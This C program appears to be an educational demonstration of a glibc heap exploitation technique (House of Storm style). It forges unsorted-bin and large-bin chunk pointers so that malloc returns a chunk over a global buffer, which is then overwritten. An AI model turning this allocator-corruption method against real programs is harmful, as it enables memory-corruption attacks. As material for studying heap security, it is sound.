#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char filler[0x10];
char target[0x60]; 

void init(){
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        // clearenv();
}


int get_shift_amount(char* pointer){

        int shift_amount = 0;
        long long ptr = (long long)pointer;

        while(ptr > 0x20){
                ptr = ptr >> 8;
                shift_amount += 1;
        }

        return shift_amount - 1; 
}

int main(){

	init();

	char *unsorted_bin, *large_bin, *fake_chunk, *ptr;

	unsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 

	// prevent merging 
	malloc ( 0x18 ); 

	puts("Find the proper chunk size to allocate.");
	puts("Must be exactly the size of the written chunk from above.");

	int shift_amount = get_shift_amount(unsorted_bin);
        printf("Shift Amount: %d\n", shift_amount);

        size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
        if(alloc_size < 0x10){
                printf("Chunk Size: 0x%lx\n", alloc_size);
                puts("Chunk size is too small");
                exit(1);
        }
        alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // Remove the size bits
        printf("In this case, the chunk size is 0x%lx\n", alloc_size);



        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
                puts("Allocation size has bit 4 of the size set or ");
                puts("mmap and non-main arena bit check will fail");
                puts("Please try again! :)");
                puts("Exiting...");
                return 1;

	}

	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 
	// prevent merging 
	malloc ( 0x18 );

	// FIFO 
	free ( large_bin );  // put small chunks first 
	free ( unsorted_bin );

	// Put the 'large bin' chunk into the large bin
	unsorted_bin = malloc(0x4e8);
	free(unsorted_bin);


	// The address that we want to write to!
	fake_chunk = target - 0x10;

	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk

	// Only needs to be a valid address. 
	(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin->fd



	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize


	printf("String before: %s\n", target);
	printf("String pointer: %p\n", target);
	
	ptr = malloc(alloc_size);
	strncpy(ptr, "\x41\x42\x43\x44\x45\x46\x47", 0x58 - 1);
	
	printf("String after %s\n", target);
	printf("Fake chunk ptr: %p\n", ptr);

	return 0;
}
